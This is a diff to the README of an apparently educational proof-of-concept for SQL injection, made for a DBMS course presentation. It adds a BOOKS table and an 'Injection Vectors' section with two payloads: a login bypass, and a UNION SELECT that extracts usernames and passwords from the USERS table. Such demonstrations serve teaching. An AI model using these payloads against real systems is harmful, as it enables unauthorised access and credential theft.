@@ -25,6 +25,12 @@ A PoC to demonstate basic SQL injection vulnarabilities. B. Tech DBMS Presentati
    CREATE TABLE USERS(username varchar2(26) NOT NULL PRIMARY KEY, pass varchar2(16) NOT NULL);
    ```
 
+5. Create books table and populate with dummy data
+
+   ```sql
+   CREATE TABLE BOOKS (BOOK_NO NUMBER(6) PRIMARY KEY, BOOK_NAME VARCHAR2(30) NOT NULL, AUTHOR_NAME VARCHAR2(30), COST NUMBER(7,2), CATEGORY CHAR(10));
+   ```
+
 ## Using docker
 
 Remember: It's just experimental. May not work out of the box.
@@ -55,6 +61,20 @@ password: admin
 ```
 
 Then create a new workspace, schema and set password accordingly.
+
+## Injection Vectors
+
+### Login
+
+```sql
+admin' OR 1 = 1 --
+```
+
+### Book Search
+
+```sql
+a') UNION SELECT 0, username, pass, 0, 'OTHERS' FROM USERS --
+```
 
 ## Troubleshooting
 
